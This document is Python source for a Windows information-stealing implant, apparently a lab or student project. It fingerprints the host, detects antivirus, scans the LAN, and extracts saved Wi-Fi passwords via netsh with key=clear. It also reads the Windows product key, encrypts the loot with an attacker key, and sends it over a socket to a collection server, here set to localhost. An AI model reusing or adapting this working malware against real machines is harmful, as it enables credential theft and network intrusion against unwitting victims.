import sys 

from victim_modules.encryption import *
from victim_modules.LAN_scan import *


import platform
import socket
import urllib.request
#import ping3
import subprocess
import json
import wmi

#write that the code waits until it recieves a network connection

class Windows:
    """
    a class for windows information gathering, this class is downloaded if the host identified is running windows OS
    """

    def __init__(self):
        self.ID = self.get_ID() #each victim will get a unique id 
        self.output_file = ""
        self.encrypt = ""
        self.victim_encrypted_private_key = "" 
        self.OS = self.OS_detection()
        self.system_info = {}
        self.antivirus = []
        self.ip_info = {} # a dictionary where information about the infected computers IP will appear in
        self.ssids = []
        self.wifi_passwords = {}
        self.found_lan_devices = {}
        self.chrome_passwords = {}

    def get_ID(self):
        return subprocess.run('echo %COMPUTERNAME%', stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True).stdout.strip()
        

    def encryption_setup(self):
        """
        this function sets the encrption for the victim
        this is the first function that needs to be executed
        
        1. first the function generates a keypair for the victim to use
        2. the function loads in the attackers allready generated public key
        3. the function uses the public key from the attacker to encrypt the victims private key
        4. the function then overwrites the attacker and victims private key
        5. now only the attacker (owner of the attacker private key) can decrypt the victim_encrypted_private_key, this key can read the data being sent back

        
        """
        #encryption IDs would be used to identify which key belongs to which victim
        #in a "real life" situation each infected host will have a diffrent keypair
        encryption_id = "encryption" + self.ID
        public_key = "public_"+ encryption_id +".pem"
        private_key = "private_"+ encryption_id +".pem"
        
        #init a new instance of my assymetric AES encryption module for the victim
        encryption_victim = Encryption(encryption_id, public_key, private_key)
        #set the victims encryption instance 
        self.encrypt = encryption_victim
        #generate encryption keys for the victim
        print("generating victim key pair...")
        encryption_victim.generate_keys()
        
        #load the public key and private keys from their generated keyfile
        print("loading victim keys... ")
        encryption_victim.load_private_key()
        encryption_victim.load_public_key()
        

        with open(private_key, "r") as private_keyfile:
            victim_private_key = private_keyfile.read().strip("\n") #will return each line as a item in a list
            
        encryption_attacker = Encryption("ATCK3R", "public_attacker.pem")

        encryption_attacker.load_public_key()

        # Encrypt the victim's private key with the attacker's public key
        
        self.victim_encrypted_private_key = encryption_attacker.encrypt(victim_private_key)

        # Overwrite and delete both private keys so they cannot be recovered
        encryption_victim.overwrite_key("private")
        encryption_attacker.overwrite_key("public")



#upgraded to threaded pinging
    #def ping_host(host):
        #"""
        #a function to ping a host returns true if up false if down
        #"""
        #try:
            #result = ping3.ping(host, timeout=0.1)
            #if result is not None:
            #    return True
            #else:
            #    return False
        #except:
        #    return False


    def OS_detection(self):
        """
        a method for OS detection
        """
        system = platform.system()
        

        if system == "Windows":
            return "Windows"
        elif system == "Linux":
            return "Linux"
        elif system == "Darwin":
            return "macOS"
        else:
            return "Unknown"
        
    def get_system_info(self):
        """
        A method which grabs basic Windows system information
        """

        commands = {'OS Version': 'systeminfo | find "OS Version"',
                    'System Manufacturer': 'systeminfo | find "System Manufacturer"',
                    'System Boot Time': 'systeminfo | find "System Boot Time"', 
                    'Total Physical Memory': 'systeminfo | find "Total Physical Memory"',
                    'Computer Name': 'echo %COMPUTERNAME%',
                    'CPU': 'wmic cpu get name /format:list',
                    'Total Physical Memory': 'systeminfo | find "Total Physical Memory"',
                    'Username': 'echo %USERNAME%',
                    'Registered Owner':  'systeminfo | find "Registered Owner"',
                    'Product ID': 'systeminfo | find "Product ID"',
                    'Windows product key':'wmic path softwarelicensingservice get OA3xOriginalProductKey',
                    'keyboard Layout': 'systeminfo | find "Input Locale"' #handy for determining which keylogger to use
                    }
        
        for key, command in commands.items():
            try:
                output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True).stdout.strip()
                # Clean up the output
                if ':' in output:
                    output = output.split(":", 1)[-1].strip()  # Extracting the value part after the first occurrence of ':'
                self.system_info[key] = output

            except:
                pass

    def get_antivirus(self):
        """
        a method which tries to detect installed anti virus software
        """
            
        c = wmi.WMI()
        

        # Query Windows Security Center for antivirus products
        for antivirus in c.Win32_Product():
            if antivirus.Caption:
                if "antivirus" in antivirus.Caption.lower():
                    self.antivirus.append(antivirus.Caption)

    def get_ip_info(self):
        """
        this function gathers basic ip information about the infected host
        1. gets the hostname of the machine
        2. gets the internal IP address of the machine
        3. gets the router IP
        4. gets the external IP 
        """

        ip_info = {}

        #use the sockets library so it works on all OS
        #get hostname
        print("getting hostname...")
        hostname = socket.gethostname()
        ip_info["hostname"] = hostname

        #get IP
        print("retrieving internal IP address...")
        internal_ip_address = socket.gethostbyname(hostname)
        ip_info["internal_ip_address"] = internal_ip_address

        
        index = internal_ip_address.rfind('.')
        #get everything before the last point (eg.: "192.168.1")
        ip_prefix = (internal_ip_address[:index]) + "."
        
        ip_info["subnet"] = ip_prefix
        
        #get router IP
        router_ip = ip_prefix + "1"
        ip_info["router_ip"] = router_ip

        #get the External ip using a request 
        print("retrieving external IP address...")
        try:
            external_ip_address = urllib.request.urlopen('https://v4.ident.me/').read().decode('utf8')
        except Exception as error:
            print(f"failed: {error}")
        ip_info["external_ip_address"] = external_ip_address

        self.ip_info = ip_info
    
    def ping_LAN(self):
        """
        a method which pings all the available devices in the victims lan, nmap scans can be run to see other devices
        """
        subnet = self.ip_info["subnet"]

        
        LAN_Scan = ping_range(subnet,0 , 255)
        self.found_lan_devices["ips"] = LAN_Scan
        #print(self.found_lan_devices) 
    
    def get_wifi_SSIDS(self):
        """
        a method which exploits the windows netsh wlan show profile command to show all the know wifi ssids
        """
        try:
            #windows command is netsh wlan show profiles, this will display all the profiles 
            output = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8").split("\n")
            #clear the rest of the output and only show the SSIDs and add them to a list ssids
            #strip all the information before the ':' away for each line
            self.ssids = [line.split(":")[1].strip() for line in output if "All User Profile" in line]
            #print(self.ssids)
        except:
            print("admin is needed or this is not a windows device")

    def get_wifi_passwords(self):
        """
        a method which exploits the windows netsh wlan show profile with a key set to clear command to show all the know wifi passwords corresponding with the ssids
        """
        
        try:
            for ssid in self.ssids:
                #netsh wlan show profile <ssid> key=clear shows the password associated with it that is stored in memory might reuire root
                output = subprocess.check_output(["netsh", "wlan", "show", "profile", ssid, "key=clear"]).decode("utf-8").split("\n")
                password_lines = [line.strip() for line in output if "Key Content" in line]
                if password_lines:
                    password = password_lines[0].split(":")[1].strip()
                    self.wifi_passwords[ssid] = password
                    
                else:
                    #print("couldnt get passwords, is the ssid list filled?")
                    pass

        except:
            pass
            #print("couldnt get passwords, is the ssid list filled?")

    def steal_browser_passwords(self):
        """
        this function will find out the browsers used on the machine and try to steal the passwords
        """
        pass


    def encrypt_exfil_data(self):
        """
        this method groups all the information gathered into a clean format, and then encrypts this

        1. the function first groups data into a dictionary called exfil_data
        """
        exfil_data = {

            "Detected OS": self.OS,
            "System information stolen": self.system_info,
            "detected antivirus softwore":self.antivirus,
            "IP info gathered" : self.ip_info,
            "Found local SSIDS" : self.ssids,
            "wifi passwords stolen" : self.wifi_passwords,
            "other network devices found" : self.found_lan_devices
        }

        json_str = json.dumps(exfil_data)
        # Encrypt the serialized data with the victim's public key
        encrypted_exfil_data = self.encrypt.encrypt(json_str)
        #print(encrypted_exfil_data)
        
        self.output_file = "output_" + self.ID +".txt"

        with open(self.output_file, "wb") as outfile:
            outfile.write(b"Victim "+ (self.ID).encode() +b" private key(encrypted)\n---\n" + self.victim_encrypted_private_key + b"\n---\n")
            outfile.write(b"victims encrypted data\n---\n"+encrypted_exfil_data)

    def exfil_data(self):
        """
        this method connects to a socket server and sends over the encrypted file
        """
        host = '127.0.0.1'
        port = 9000

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))

            with open(self.output_file, "rb") as file:
                while True:
                    data = file.read(1024)
                    if not data:
                        break
                    s.sendall(data)
            print("File sent successfully...")



        
        





#print(test.return_priv_key())

